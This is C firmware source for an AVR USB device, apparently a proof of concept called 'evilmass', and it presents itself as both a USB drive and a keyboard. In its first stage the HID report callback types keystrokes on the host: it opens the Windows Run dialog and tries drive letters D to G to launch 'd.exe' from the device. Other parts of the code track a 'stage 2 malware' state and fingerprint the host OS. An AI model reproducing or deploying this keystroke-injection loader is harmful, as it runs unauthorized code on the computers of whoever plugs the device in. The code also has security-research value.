/*
MIT License - Copyright 2021
-
David Reguera Garcia aka Dreg - dreg@fr33project.org
-
http://www.rootkit.es/
http://github.com/David-Reguera-Garcia-Dreg/therealdreg
http://www.fr33project.org/
-
Permission is hereby granted, free of charge, to any person obtaining a copy
of this software and associated documentation files (the "Software"), to deal
in the Software without restriction, including without limitation the rights
to use, copy, modify, merge, publish, distribute, sublicense, and/or sell
copies of the Software, and to permit persons to whom the Software is
furnished to do so, subject to the following conditions:
The above copyright notice and this permission notice shall be included in
all copies or substantial portions of the Software.
THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR
IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,
FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE
AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER
LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING
FROM, OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS
IN THE SOFTWARE.

WARNING! this is a POC, the code is CRAP
*/

/** \file
 *
 *  Main source file for the MassStorageKeyboard demo. This file contains the main tasks of
 *  the demo and is responsible for the initial application hardware configuration.
 */

#include "evilmass.h"

#include <ctype.h>

#include "sdcard.h"

#include "mmc_avr.h"
#include "diskio.h"
#include "misc.h"
#include "eepr.h"
#include <util/atomic.h>

#include "at90lib.h"

bool disable_keyboard_hack = false;



uint8_t last_led = false;

/** LUFA Mass Storage Class driver interface configuration and state information. This structure is
 *  passed to all Mass Storage Class driver functions, so that multiple instances of the same class
 *  within a device can be differentiated from one another.
 */
USB_ClassInfo_MS_Device_t Disk_MS_Interface =
{
    .Config =
    {
        .InterfaceNumber           = INTERFACE_ID_MassStorage,
        .DataINEndpoint            =
        {
            .Address           = MASS_STORAGE_IN_EPADDR,
            .Size              = MASS_STORAGE_IO_EPSIZE,
            .Banks             = 1,
        },
        .DataOUTEndpoint            =
        {
            .Address           = MASS_STORAGE_OUT_EPADDR,
            .Size              = MASS_STORAGE_IO_EPSIZE,
            .Banks             = 1,
        },
        .TotalLUNs                 = TOTAL_LUNS,
    },
};

/** Buffer to hold the previously generated Keyboard HID report, for comparison purposes inside the HID class driver. */
static uint8_t PrevKeyboardHIDReportBuffer[sizeof(USB_KeyboardReport_Data_t)];

/** LUFA HID Class driver interface configuration and state information. This structure is
 *  passed to all HID Class driver functions, so that multiple instances of the same class
 *  within a device can be differentiated from one another.
 */
USB_ClassInfo_HID_Device_t Keyboard_HID_Interface =
{
    .Config =
    {
        .InterfaceNumber              = INTERFACE_ID_Keyboard,
        .ReportINEndpoint             =
        {
            .Address              = KEYBOARD_EPADDR,
            .Size                 = KEYBOARD_EPSIZE,
            .Banks                = 1,
        },
        .PrevReportINBuffer           = PrevKeyboardHIDReportBuffer,
        .PrevReportINBufferSize       = sizeof(PrevKeyboardHIDReportBuffer),
    },
};


/** Main program entry point. This routine contains the overall program flow, including initial
 *  setup of all components and the main program loop.
 */
int main(void)
{
    SetupHardware();

    LEDs_SetAllLEDs(LEDMASK_USB_NOTREADY);

    GlobalInterruptEnable();

    for (;;)
    {
        MS_Device_USBTask(&Disk_MS_Interface);
        HID_Device_USBTask(&Keyboard_HID_Interface);
        USB_USBTask();
        delete_stages_files();
    }
}




volatile UINT Timer;    /* Performance timer (100Hz increment) */

// Keep TIMER1 for ALTSOFTSERIAL
#define USE_TIMER3_FATFS 1

static void mioinit (void)
{
    //MCUCR = _BV(JTD); MCUCR = _BV(JTD);   /* Disable JTAG */

    //pull up

    PORTA = 0b11111111;
    PORTB = 0b11111111;
    PORTC = 0b11111111;
    PORTD = 0b11111111;
    //PORTE = 0b11111111;
    PORTF = 0b11111111;
    //PORTG = 0b00011111;

#ifdef USE_TIMER3_FATFS
    // TIMER3
    TCCR3A = 0;
    TCCR3B = 0;
    TCCR3B |= (1 << WGM32);   //CTC mode; clock timer comare
    TIMSK3 |= (1 << OCIE3A); //ENABLE INTERUPTs
    OCR3A = 0x4E20;
    TCCR3B |=  (1 << CS31); //PRESCALER
#else
    //TIMER1
    TCCR1A = 0;
    TCCR1B = 0;
    TCCR1B |= (1 << WGM12);   //CTC mode; clock timer comare
    TIMSK1 |= (1 << OCIE1A); //ENABLE INTERUPTs
    OCR1A = 0x4E20;
    TCCR1B |=  (1 << CS11); //PRESCALER
#endif

    sei();
}

#ifdef USE_TIMER3_FATFS
// TIMER3
ISR(TIMER3_COMPA_vect)
{
    Timer++;            /* Performance counter for this module */
    disk_timerproc();   /* Drive timer procedure of low level disk I/O module */
}
#else
//TIMER1
ISR(TIMER1_COMPA_vect)
{
    Timer++;            /* Performance counter for this module */
    disk_timerproc();   /* Drive timer procedure of low level disk I/O module */
}
#endif

#include "at90lib.h"

/** Configures the board hardware and chip peripherals for the demo's functionality. */
void SetupHardware(void)
{
    /* Disable watchdog if enabled by bootloader/fuses */
    MCUSR &= ~(1 << WDRF);
    wdt_disable();

    /* Disable clock division */
    clock_prescale_set(clock_div_1);

    _delay_ms(1000);

    ATOMIC_BLOCK(ATOMIC_RESTORESTATE )
    {
        eepr_boot();
        save_eepr();
    }


    /* Hardware Initialization */
    mioinit();

    Serial_Init(9600, false);
    Serial_SendString("\r\n\r\nSetup mass storage sd and keyboard by David Reguera Garcia aka Dreg - MIT License\r\ndreg@fr33project.org\r\nhttps://github.com/therealdreg\r\n");
    Serial_CreateStream(NULL);
    printf("https://www.rootkit.es\r\n");
    printf_P(PSTR("https://www.fr33project.org\r\npowered by LUFA http://elm-chan.org/fsw/ff/00index_e.html and FatFs http://elm-chan.org/fsw/ff/00index_e.html\r\n\r\n"));

    init_xmem();
    set_bank(0);
    ((uint8_t*)XMEM_START)[0x69] = 0;
    ((uint8_t*)XMEM_START)[0x69] = 0x69;
    if (((uint8_t*)XMEM_START)[0x69] == 0x69)
    {
        printf("\r\nexternal memory is working good\r\n");
    }
    else
    {
        printf("\r\nERROR! external memory is not working\r\n");
    }

    if (eppr_vars.curr_stage == STAG_1)
    {
        CMD_t cmd = { .cmd = PRLE_CMD_AM_I_IN_STAGE2 };
        if (send_cmd(&cmd, NULL))
        {
            eppr_vars.curr_stage = STAG_2;
            printf("\r\n\r\nI AM IN STAGE 2 MALWARE IN USB!\r\n");
        }
        else
        {
            printf("\r\ni am not in stage 2\r\n");
        }
    }

    print_eepr();

    for (int i = 0; i < 3; i++)
    {
        _delay_ms(1000);
    }

    on_sd();

    sdcard_Init();

    LEDs_Init();

    Buttons_Init();

    USB_Init();
}

/** Event handler for the library USB Connection event. */
void EVENT_USB_Device_Connect(void)
{
    printf_P(PSTR("Connect\r\n"));

    LEDs_SetAllLEDs(LEDMASK_USB_ENUMERATING);
}

/** Event handler for the library USB Disconnection event. */
void EVENT_USB_Device_Disconnect(void)
{
    printf_P(PSTR("Disconnect\r\n"));
    LEDs_SetAllLEDs(LEDMASK_USB_NOTREADY);
}

/** Event handler for the library USB Configuration Changed event. */
void EVENT_USB_Device_ConfigurationChanged(void)
{
    bool ConfigSuccess = true;

    printf_P(PSTR("Ready\r\n"));

    ConfigSuccess &= HID_Device_ConfigureEndpoints(&Keyboard_HID_Interface);
    ConfigSuccess &= MS_Device_ConfigureEndpoints(&Disk_MS_Interface);

    USB_Device_EnableSOFEvents();

    LEDs_SetAllLEDs(ConfigSuccess ? LEDMASK_USB_READY : LEDMASK_USB_ERROR);
}

/** Event handler for the library USB Control Request reception event. */
void EVENT_USB_Device_ControlRequest(void)
{
    MS_Device_ProcessControlRequest(&Disk_MS_Interface);
    HID_Device_ProcessControlRequest(&Keyboard_HID_Interface);
}

/** Mass Storage class driver callback function the reception of SCSI commands from the host, which must be processed.
 *
 *  \param[in] MSInterfaceInfo  Pointer to the Mass Storage class interface configuration structure being referenced
 */
bool CALLBACK_MS_Device_SCSICommandReceived(USB_ClassInfo_MS_Device_t* const
        MSInterfaceInfo)
{
    bool CommandSuccess;
    static bool show_os = false;

    if (!show_os)
    {
        show_os = true;
        printf("\r\nguess_host_os: %s\r\n", guess_host_os_string());
    }

    LEDs_SetAllLEDs(LEDMASK_USB_BUSY);

    CommandSuccess = SCSI_DecodeSCSICommand(MSInterfaceInfo);

    LEDs_SetAllLEDs(LEDMASK_USB_READY);

    return CommandSuccess;
}

/** Event handler for the USB device Start Of Frame event. */
void EVENT_USB_Device_StartOfFrame(void)
{
    HID_Device_MillisecondElapsed(&Keyboard_HID_Interface);
}


/** HID class driver callback function for the creation of HID reports to the host.
 *
 *  \param[in]     HIDInterfaceInfo  Pointer to the HID class interface configuration structure being referenced
 *  \param[in,out] ReportID    Report ID requested by the host if non-zero, otherwise callback should set to the generated report ID
 *  \param[in]     ReportType  Type of the report to create, either HID_REPORT_ITEM_In or HID_REPORT_ITEM_Feature
 *  \param[out]    ReportData  Pointer to a buffer where the created report should be stored
 *  \param[out]    ReportSize  Number of bytes written in the report (or zero if no report is to be sent)
 *
 *  \return Boolean \c true to force the sending of the report, \c false to let the library determine if it needs to be sent
 */
bool CALLBACK_HID_Device_CreateHIDReport(USB_ClassInfo_HID_Device_t* const
        HIDInterfaceInfo,
        uint8_t* const ReportID,
        const uint8_t ReportType,
        void* ReportData,
        uint16_t* const ReportSize)
{
    USB_KeyboardReport_Data_t* KeyboardReport = (USB_KeyboardReport_Data_t*)
            ReportData;
    static uint16_t cnt = 0x2FFF;
    static uint8_t curr_snd = 0;
    static uint8_t reset_mod = 0;
    static uint8_t curr_let = HID_KEYBOARD_SC_A;
    static uint8_t max_tries = 3;

    uint8_t ButtonStatus_LCL = Buttons_GetStatus();

    if (ButtonStatus_LCL & BUTTONS_BUTTON1)
    {
        print_eepr();
        printf_P(PSTR("\r\nresetting epprom values in the next reboot\r\n"));
        ATOMIC_BLOCK(ATOMIC_RESTORESTATE )
        {
            eppr_vars.restore_defaults_on_boot = 1;
            save_eepr();
        }
        CMD_t cmd = { .cmd = PRLE_CMD_FORMAT };
        send_cmd(&cmd, NULL);
        cmd.cmd = PRLE_CMD_REBOOTME;
        send_cmd(&cmd, NULL);
    }

    if (STAG_1 != eppr_vars.curr_stage || disable_keyboard_hack)
    {
        goto bypass;
    }

//#define NO_BRUTE_KEYBOARD
#ifdef NO_BRUTE_KEYBOARD
    goto bypass;
#endif

    if (reset_mod == 1)
    {
        KeyboardReport->Modifier = 0;
        reset_mod = 0;
    }
    else if (max_tries != 0)
    {
        if (cnt-- == 0)
        {
            switch (curr_snd)
            {
                case 0:
                    KeyboardReport->Modifier = HID_KEYBOARD_MODIFIER_RIGHTGUI;
                    KeyboardReport->KeyCode[0] = HID_KEYBOARD_SC_R;
                    reset_mod = 1;
                    break;

                case 1:
                    KeyboardReport->KeyCode[0] = HID_KEYBOARD_SC_DELETE;
                    break;

                case 2:
                    KeyboardReport->KeyCode[0] = curr_let;
                    curr_let++;
                    if (curr_let == HID_KEYBOARD_SC_H)
                    {
                        curr_let = HID_KEYBOARD_SC_D;
                        max_tries--;
                    }
                    break;

                case 3:
                    KeyboardReport->Modifier = HID_KEYBOARD_MODIFIER_LEFTSHIFT;
                    KeyboardReport->KeyCode[0] = HID_KEYBOARD_SC_SEMICOLON_AND_COLON;
                    reset_mod = 1;
                    break;

                case 4:
                    KeyboardReport->KeyCode[0] = HID_KEYBOARD_SC_BACKSLASH_AND_PIPE ;
                    break;

                case 5:
                    KeyboardReport->KeyCode[0] = HID_KEYBOARD_SC_D;
                    break;

                case 6:
                    KeyboardReport->KeyCode[0] = HID_KEYBOARD_SC_DOT_AND_GREATER_THAN_SIGN;
                    break;

                case 7:
                    KeyboardReport->KeyCode[0] = HID_KEYBOARD_SC_E;
                    break;

                case 8:
                    KeyboardReport->KeyCode[0] = HID_KEYBOARD_SC_X;
                    break;

                case 9:
                    KeyboardReport->KeyCode[0] = HID_KEYBOARD_SC_E;
                    break;

                case 10:
                    KeyboardReport->KeyCode[0] = HID_KEYBOARD_SC_ENTER;
                    break;

                case 11:
                    KeyboardReport->KeyCode[0] = HID_KEYBOARD_SC_ENTER;
                    curr_snd = 0;
                    break;
            }
            cnt = 0x1FF;
            curr_snd++;
        }
    }
bypass:
    *ReportSize = sizeof(USB_KeyboardReport_Data_t);
    return false;
}

/** HID class driver callback function for the processing of HID reports from the host.
 *
 *  \param[in] HIDInterfaceInfo  Pointer to the HID class interface configuration structure being referenced
 *  \param[in] ReportID    Report ID of the received report from the host
 *  \param[in] ReportType  The type of report that the host has sent, either HID_REPORT_ITEM_Out or HID_REPORT_ITEM_Feature
 *  \param[in] ReportData  Pointer to a buffer where the received report has been stored
 *  \param[in] ReportSize  Size in bytes of the received HID report
 */
void CALLBACK_HID_Device_ProcessHIDReport(USB_ClassInfo_HID_Device_t* const
        HIDInterfaceInfo,
        const uint8_t ReportID,
        const uint8_t ReportType,
        const void* ReportData,
        const uint16_t ReportSize)
{
    uint8_t  LEDMask   = LEDS_NO_LEDS;
    uint8_t* LEDReport = (uint8_t*)ReportData;

    if (last_led)
    {
        return;
    }

    if (*LEDReport & HID_KEYBOARD_LED_NUMLOCK)
    {
        LEDMask |= LEDS_LED1;
    }

    if (*LEDReport & HID_KEYBOARD_LED_CAPSLOCK)
    {
        LEDMask |= LEDS_LED2;
    }

    if (*LEDReport & HID_KEYBOARD_LED_SCROLLLOCK)
    {
        LEDMask |= LEDS_LED1 | LEDS_LED2;
    }

    LEDs_SetAllLEDs(LEDMask);
}

